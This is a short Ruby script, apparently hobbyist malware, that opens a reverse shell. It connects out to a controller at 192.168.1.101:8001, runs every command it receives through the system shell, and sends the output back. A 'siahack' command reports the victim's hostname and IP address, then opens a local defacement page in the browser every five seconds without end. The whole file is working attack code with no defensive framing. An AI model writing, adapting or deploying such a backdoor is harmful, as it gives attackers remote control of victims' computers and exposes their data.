#!/usr/bin/ruby

require "socket"
require "launchy"

host = "192.168.1.101"
port = "8001"

s = TCPSocket.open(host, port)

begin
  while true
    comm = s.gets.chomp
    
    case comm
    when "siahack"
      #system info
      host = Socket.gethostname
      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
      s.puts("[*] Host name : #{host}")
      s.puts("[*] Ip Address : #{ip}")

      while true
        #time to open browser :D
        sleep(5)
        Launchy.open("file:///home/virus007/Desktop/sia-payload/deface.html")
      end

    else
      res = %x{#{comm}}
      s.puts(res)
    end
  end

rescue
  while true
    comm = s.gets.chomp

    case comm
    when "siahack"
      #system info
      host = Socket.gethostname
      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
      s.puts("[*] Host name : #{host}")
      s.puts("[*] Ip Address : #{ip}")

      while true
        #time to open browser :D
        sleep(5)
        Launchy.open("file:///home/virus007/Desktop/sia-payload/deface.html")
      end

    else
      res = %x{#{comm}}
      s.puts(res)
    end
  end
end
